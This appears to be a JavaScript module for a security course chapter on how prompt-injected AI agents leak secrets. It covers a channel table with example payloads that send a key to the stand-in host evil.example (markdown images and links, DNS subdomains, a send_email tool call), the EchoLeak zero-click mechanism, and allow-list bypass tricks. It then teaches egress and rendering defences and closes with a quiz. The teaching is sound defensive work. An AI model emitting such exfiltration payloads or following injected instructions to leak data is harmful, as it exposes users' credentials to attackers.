import { h2, h3, p, ul, ol, steps, kv, callout, detail, table, code, figure, svg, box, arrow, svgText, sim, select, button, toggle, out, pill } from '../../lib/components.mjs';

export const meta = { time: 15, attacks: '8 channels, 9 encodings' };
export const scripts = ['/assets/js/sims/a09.js'];

const echoleak = svg(740, 300, `
${svgText(12, 18, 'ZERO-CLICK EXFILTRATION — WHY THE AGENT MAKES NO REQUEST', 'd-ttl', 'start')}

${box(20, 56, 128, 50, 'attacker', 'sends an email', 'd-attack')}
${box(180, 56, 128, 50, 'agent', 'summarises inbox')}
${box(340, 56, 128, 50, 'context', 'payload + secret', 'd-attack')}
${box(500, 56, 128, 50, 'answer', 'markdown with an image', 'd-attack')}
${box(500, 176, 128, 50, 'client', 'renders the answer', 'd-sunk')}
${box(300, 176, 128, 50, 'attacker server', 'logs the query string', 'd-attack')}

${arrow(148, 81, 178, 81)}
${arrow(308, 81, 338, 81)}
${arrow(468, 81, 498, 81)}
${arrow(564, 106, 564, 174)}
${arrow(498, 201, 430, 201, 'GET ?d=SECRET', 'd-attack-l')}

${svgText(564, 250, 'the CLIENT makes this request', 'd-attack-t')}
${svgText(564, 266, 'not the agent', 'd-attack-t')}

<rect x="170" y="42" width="470" height="80" rx="8" class="d-bnd"/>
${svgText(640, 36, 'EVERY EGRESS CONTROL SCOPED TO THE AGENT SEES NOTHING HERE', 'd-bnd-t', 'end')}

${svgText(12, 292, 'No user clicked. No agent tool call. No outbound socket from the agent process. CVE-2025-32711.', 'd-attack-t', 'start')}
`, { label: 'Zero-click exfiltration through client-side image rendering' });

export const body = `
${p(`An injection that cannot phone home is a nuisance. This chapter is about the last link in the
chain: how the bytes actually leave, why your DLP regex is looking for the wrong string, and the two
controls that close most of it.`)}

${h2('Eight channels for the same twenty-one bytes', 'channels')}

${table(
  ['Channel', 'The payload', 'Who makes the request'],
  [
    ['Markdown image', '<code>![](https://evil.example/p.png?d=sk_live_…)</code>', '<b>the rendering client</b>, automatically'],
    ['Markdown link', '<code>[Your report](https://evil.example/r?d=…)</code>', 'the user, on click'],
    ['Autolinked URL', 'a bare URL in the answer text', 'the client, prefetching a link preview'],
    ['DNS lookup', '<code>nbuw…y3ta.evil.example</code>', 'the resolver chain, which works through HTTP proxies'],
    ['Tool argument', '<code>send_email(to="a@evil.example", body=SECRET)</code>', 'the agent (the only one most policies check)'],
    ['File write', 'a line in <code>/shared/notes.md</code>', 'cloud sync, a site build, or CI, minutes later'],
    ['Message to a peer agent', '<code>delegate(task="look up sk_live_…")</code>', 'the peer, which has the network access this one lacks'],
    ['Error message', '<code>ValueError: could not parse sk_live_…</code>', 'your own log shipper, into a shared sink'],
  ]
)}

${figure(echoleak, `<b>EchoLeak, in structure.</b> The agent read a poisoned email, put a secret in
context, and emitted markdown. That is all it did. The exfiltration was performed by the mail client
doing its job. An egress policy scoped to the agent's process observed nothing, and a
human-in-the-loop gate on agent actions never fired, because there was no action to approve.`)}

${h2('Your DLP is matching the wrong string', 'encodings')}

${sim({
  name: 'a09encode',
  title: 'One secret, nine encodings, three detectors',
  controls: [
    select('a09-det', 'Detector', [
      ['literal', 'Substring match on the literal secret'],
      ['entropy', 'High-entropy token heuristic'],
      ['pattern', 'Regex for the key format (sk_live_…)'],
      ['combined', 'All three'],
    ], 'literal'),
    toggle('a09-slow', 'Also test the slow channel (1 char per session)', false),
  ].join(''),
  body: out('a09-out'),
  note: `The slow channel is the honest limit of every per-message detector: no single message
    contains enough of the secret to trigger anything, and the attacker reassembles it across
    sessions. Detecting that requires aggregate analysis over time, which is A26 territory, not a
    filter.`,
})}

${h2('Control 1: an egress allow-list that is actually correct', 'egress')}

${p(`The control is simple and the implementation has three classic bugs. All three appear in real
code.`)}

${code(`ALLOWED_HOSTS = {"api.internal.corp", "docs.internal.corp"}

def egress_ok(url: str) -> bool:
    m = re.match(r"https?://([^/:]+)", url)
    return bool(m) and m.group(1) in ALLOWED_HOSTS     # equality, not "in"`,
  { lang: 'py', file: 'code/a09_exfiltration.py', tag: 'safe' })}

${table(
  ['Test URL', 'Naive substring check', 'Host equality'],
  [
    ['<code>https://api.internal.corp/v1/write</code>', 'allow ✓', 'allow ✓'],
    ['<code>https://evil.example/p.png?d=sk_live</code>', 'deny ✓', 'deny ✓'],
    ['<code>https://api.internal.corp<b>.evil.example</b>/x</code>', '<b>allow ✗</b> (suffix trick)', 'deny ✓'],
    ['<code>https://api.internal.corp<b>@evil.example</b>/x</code>', '<b>allow ✗</b> (userinfo trick)', 'deny ✓'],
    ['<code>http://169.254.169.254/latest/meta-data/</code>', 'deny ✓', 'deny ✓, but see below'],
  ]
)}

${callout('warn', 'Three more things to get right', `
<ul style="margin-bottom:0">
<li><b>Resolve before you allow.</b> DNS rebinding turns an allowed hostname into an internal IP
between your check and the connection. Pin the resolved address, or enforce at the network layer where
the check and the connection are the same event.</li>
<li><b>Block the link-local range explicitly.</b> <code>169.254.169.254</code> is the cloud metadata
service, and reaching it is credential theft, not exfiltration. It is not on your allow-list, but it
is worth a separate deny rule so the finding is legible.</li>
<li><b>Enforce below the agent.</b> A check inside the agent process is bypassed by any code the agent
runs. Network policy in the sandbox, an egress proxy, or a firewall rule cannot be argued with.</li>
</ul>`)}

${h2('Control 2: do not render remote content from agent output', 'rendering')}

${p(`This closes the EchoLeak family, and it is a client-side change rather than an agent-side one,
which is why it is so often missed by the team that owns the agent.`)}

${code(`def sanitise_output(md: str) -> str:
    # remote images never auto-fetch — this is the zero-click channel
    md = re.sub(r"!\\[([^\\]]*)\\]\\((https?://[^)]+)\\)", r"[image withheld: \\1]", md)
    # external links are shown, not made clickable
    md = re.sub(r"\\[([^\\]]*)\\]\\((https?://[^)]+)\\)",
                lambda m: f"{m.group(1)} <{m.group(2)}>" if egress_ok(m.group(2))
                          else f"{m.group(1)} [external link withheld]", md)
    return md`, { lang: 'py', tag: 'safe' })}

${p(`The stronger version is a Content Security Policy on the surface that renders agent output, with
<code>img-src</code> and <code>connect-src</code> restricted to your own origins. A CSP is enforced by
the browser rather than by your regex, which puts it in the "bounds damage" column.`)}

${h2('What neither control fixes', 'residual')}

${ul([
  `<b>The human channel.</b> The agent tells the user something false and the user acts on it. No
   network involved at all. Mitigated by output provenance and by not presenting agent claims as
   fact, never by egress policy.`,
  `<b>The peer channel.</b> A second agent with wider egress. Score the graph, not the node
   (<a href="/chapters/a15/">A15</a>).`,
  `<b>The slow channel.</b> One bit per session, over many sessions, under every per-request
   threshold. Needs aggregate monitoring (<a href="/chapters/a26/">A26</a>) and per-identity rate
   limits, not message inspection.`,
])}

${h2('What you should be able to do now', 'checkpoint')}

${ul([
  `Enumerate eight exfiltration channels and say who issues the request in each.`,
  `Write an allow-list check that survives the suffix, userinfo and rebinding tricks.`,
  `Explain why a client-side CSP is a stronger control than agent-side output sanitising.`,
  `Say which exfiltration risks remain after both controls, and what addresses each.`,
])}
`;

export const quiz = [
  {
    q: `An agent's answer contains <code>![](https://evil.example/p.png?d=sk_live_51H8xQ2)</code>. The
        agent's process made no outbound connection. How did the data leave?`,
    options: [
      `It did not; without an outbound connection there is no exfiltration.`,
      `The client rendering the markdown fetched the image URL, sending the secret in the query string.`,
      `The model transmitted it during inference.`,
      `The markdown parser executed it as code.`,
    ],
    answer: 1,
    explain: `Rendering a remote image means fetching it, and the fetch carries the query string to
      the attacker's server. This is the EchoLeak mechanism and it defeats two controls at once: an
      egress policy scoped to the agent's process observes nothing, and an approval gate on agent
      actions never fires because emitting text is not an action anyone gates. The fix is on the
      rendering surface — a CSP restricting <code>img-src</code>, or refusing to auto-load remote
      images in agent output.`,
  },
  {
    q: `Your DLP blocks any output containing the literal string <code>sk_live_51H8xQ2</code>. An
        attacker base64-encodes it. What is the general problem?`,
    options: [
      `Base64 should be added to the blocklist.`,
      `The secret has unbounded representations, so matching on any finite set of them is a losing game; you need to constrain destinations rather than inspect content.`,
      `The DLP should decode all base64 before matching.`,
      `Secrets should not contain underscores.`,
    ],
    answer: 1,
    explain: `Decoding base64 is worth doing and buys you one representation. Then comes hex, base32,
      reversal, character interleaving, splitting across messages, and arbitrary reversible functions
      the model can apply on request. Content inspection is a cost-raising control against an
      unbounded space. The bounding control is on the destination: if the only reachable host is
      yours, it does not matter how the bytes are encoded.`,
  },
  {
    q: `Why is host equality required rather than a substring check in an egress allow-list?`,
    options: [
      `Substring checks are slower.`,
      `<code>api.internal.corp.evil.example</code> and <code>api.internal.corp@evil.example</code> both contain the allowed string but resolve to the attacker.`,
      `Substring matching is case-sensitive.`,
      `URLs can contain Unicode.`,
    ],
    answer: 1,
    explain: `Both tricks are trivially available to anyone who owns a domain. The suffix trick makes
      your allowed host a subdomain label of theirs; the userinfo trick puts it before an
      <code>@</code>, where browsers and most HTTP clients treat it as credentials and connect to what
      follows. Parse the URL properly, compare the host component for equality, and separately
      resolve and pin the address, because DNS rebinding attacks the gap between your check and your
      connection.`,
  },
  {
    q: `An attacker exfiltrates one character per session across forty sessions. Which control catches
        this?`,
    options: [
      `A per-message DLP scan.`,
      `An injection classifier on the input path.`,
      `Aggregate monitoring across sessions plus per-identity rate limits, not any per-request inspection.`,
      `Output length limits.`,
    ],
    answer: 2,
    explain: `The slow channel is designed against thresholds: no single message contains enough of
      the secret to be suspicious, and every request looks like normal traffic. Catching it needs
      state across sessions — repeated contact with the same unusual destination, a pattern of
      single-token outputs to one host, an identity whose traffic profile changed. That is A26's
      trajectory-level monitoring. It is worth being honest that the egress allow-list
      would have prevented it outright, and prevention beats detection here.`,
  },
  {
    q: `Which of these is <em>not</em> closed by an egress allow-list plus output sanitising?`,
    options: [
      `An outbound HTTP request to an attacker domain.`,
      `A markdown image in the rendered answer.`,
      `The agent confidently telling the user to run a command that leaks the secret.`,
      `A DNS lookup encoding the secret in a subdomain.`,
    ],
    answer: 2,
    explain: `The human channel routes around both controls entirely — no network egress, no rendered
      content, just an assistant giving instructions that a person follows. It is addressed by
      provenance in the output (showing which claims came from untrusted content), by not presenting
      agent output as authoritative, and by the same reversibility gating that A24 applies to agent
      actions. The DNS case is closed only if your policy covers name resolution, which is a reason to
      enforce at the network layer rather than in HTTP client code.`,
  },
  {
    q: `Why enforce egress policy in the sandbox or an egress proxy rather than in the agent's own
        code?`,
    options: [
      `It is faster.`,
      `A check inside the agent process is bypassed by any code the agent runs; enforcement below the process cannot be argued with.`,
      `It is easier to configure.`,
      `In-process checks cannot see DNS.`,
    ],
    answer: 1,
    explain: `Plenty of agents can execute code: a coding agent, a data-analysis agent, anything with
      a shell or an interpreter. Any of them can open its own socket, bypassing every check written
      in Python beside it. Moving enforcement to network policy in the sandbox, an egress proxy, or
      a firewall rule puts it below the level the agent operates at, which is the difference between a control
      the attacker must obey and a control the attacker can skip. It also happens to catch DNS.`,
  },
];

export const refs = [
  { authors: 'Aim Labs', title: 'EchoLeak: zero-click data exfiltration in Microsoft 365 Copilot (CVE-2025-32711)',
    venue: 'Aim Security, 2025', url: 'https://www.aim.security/lp/aim-labs-echoleak-blogpost' },
  { authors: 'Simon Willison', title: 'Exfiltration attacks (tag archive)', venue: 'simonwillison.net',
    url: 'https://simonwillison.net/tags/exfiltration-attacks/',
    note: 'the running catalogue this chapter\'s channel table is drawn from' },
  { authors: 'Johann Rehberger', title: 'ChatGPT Operator: Prompt Injection Exploits and Defenses',
    venue: 'Embrace The Red, 2025',
    url: 'https://embracethered.com/blog/posts/2025/chatgpt-operator-prompt-injection-exploits/' },
  { authors: 'Johann Rehberger', title: 'How ChatGPT Remembers You: a deep dive into memory and chat history',
    venue: 'Embrace The Red, 2025',
    url: 'https://embracethered.com/blog/posts/2025/chatgpt-how-does-chat-history-memory-preferences-work' },
  { authors: 'Yuhao Wu, Franziska Roesner, Tadayoshi Kohno, Ning Zhang, Umar Iqbal',
    title: 'SecGPT: An Execution Isolation Architecture for LLM-Based Systems', venue: 'NDSS, 2025',
    url: 'https://arxiv.org/abs/2403.04960' },
  { authors: 'Peter Yong Zhong, Siyuan Chen, Ruiqi Wang, McKenna McCall, Ben L. Titzer, Heather Miller, Phillip B. Gibbons',
    title: 'RTBAS: Defending LLM Agents Against Prompt Injection and Privacy Leakage', venue: 'arXiv, 2025',
    url: 'https://arxiv.org/abs/2502.08966' },
  { authors: 'Google GenAI Security Team', title: 'Mitigating prompt injection attacks with a layered defense strategy',
    venue: 'Google Security Blog, 2025',
    url: 'https://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html' },
  { authors: 'OWASP', title: 'LLM Prompt Injection Prevention Cheat Sheet', venue: 'OWASP Cheat Sheet Series',
    url: 'https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html' },
];
